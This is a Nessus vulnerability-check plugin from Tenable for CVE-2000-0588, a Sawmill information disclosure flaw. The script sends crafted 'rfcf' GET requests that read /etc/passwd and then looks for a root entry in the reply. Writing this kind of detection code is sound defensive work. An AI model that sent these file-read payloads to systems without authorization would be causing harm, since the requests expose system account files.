#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(10453);
  script_version("$Revision: 1.31 $");
  script_cvs_date("$Date: 2016/05/13 15:33:29 $");

  script_cve_id("CVE-2000-0588");
  script_bugtraq_id(1402);
  script_osvdb_id(352);
  script_xref(name:"EDB-ID", value:"20041");

  script_name(english:"Sawmill File Access Information Disclosure");
  script_summary(english:"Attempts to read any file.");

  script_set_attribute(attribute:"synopsis", value:
"An application running on the remote web server is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server is affected by an information disclosure
vulnerability due to improper validation of user-supplied input to the
'rfcf' parameter. An unauthenticated, remote attacker can exploit
this, via a crafted request, to disclose the first line of arbitrary
files on the remote host.");
  script_set_attribute(attribute:"solution", value:
"Upgrade Sawmill to the latest available version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/06/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2000/06/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sawmill:sawmill");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");

  script_dependencies("sawmill_detect.nasl");
  script_require_ports("Services/www", 8987, 8988);
  script_require_keys("installed_sw/Sawmill");

  exit(0);
}

#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Sawmill";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8988, embedded:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
vuln = FALSE;
# Exploits from http://www.securityfocus.com/bid/1402/exploit

u = dir + "/sawmill?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3";
r = http_send_recv3(method: "GET", item: u, port:port, exit_on_fail:TRUE);

if(egrep(pattern:".*root:.*:0:[01]:.*", string:r[2]))
{
  vuln = TRUE;
  replace_kb_item(name:"Sawmill/method", value:"standalone");
}
else
{
  u = dir + "/sawmill?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1";
  r = http_send_recv3(method: "GET", item: u, port:port, exit_on_fail:TRUE);

  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r[2]))
  {
    vuln = TRUE;
    replace_kb_item(name:"Sawmill/method", value:"cgi");
  }
}

if (vuln)
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    file        : "/etc/passwd",
    request     : make_list(build_url(qs:u, port:port)),
    output      : chomp(r[2]),
    attach_type : 'text/plain'
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir,port:port));
